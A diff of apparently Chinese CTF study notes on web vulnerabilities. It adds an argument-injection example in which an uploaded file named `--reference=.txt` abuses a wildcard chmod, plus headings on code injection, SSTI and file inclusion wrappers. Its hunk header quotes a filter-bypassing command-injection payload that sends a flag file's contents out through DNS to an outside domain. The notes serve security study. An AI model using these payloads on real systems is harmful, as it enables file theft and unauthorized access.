@@ -157,10 +157,27 @@ $(base64${IFS}f""lag_is_here${HOME:0:1}fl""ag_123591964811506.php).lulaide.com
 通常以短横线（-）或双横线（--）开头，如 -l、--help。
 - 参数
 不带 - 前缀的字符串，或者也包含在选项中作为参数（例如 -f filename 中的 filename）。
+### 例题
+来源 -> [x3ctf writeup](http://blog.whale-tw.com/2025/01/27/x3ctf-2025/#submission)
+![](image-14.png)
+所有上传的文件都会被修改权限为所有用户不可读（root除外）
+- 1. 上传 `.txt` 文件，此文件不在 `*` 内，不会被修改权限
+- 2. 上传 `--reference=.txt` 文件 ，把 `flag.txt` 的权限修改为与 `.txt` 相同的可读权限
 ## 代码注入（Code Injection）
+### SQL注入
+### `eval()`
 
 ## 服务器端模板注入（SSTI）
+### SSTI注入
 
 ## 反序列化漏洞
 
 ## 文件包含漏洞（LFI/RFI）
+### 本地文件包含
+
+### 远程文件包含
+- 1. `data://` 伪协议
+
+   例题
+   ![](image-15.png)
+- 2. `php://input`
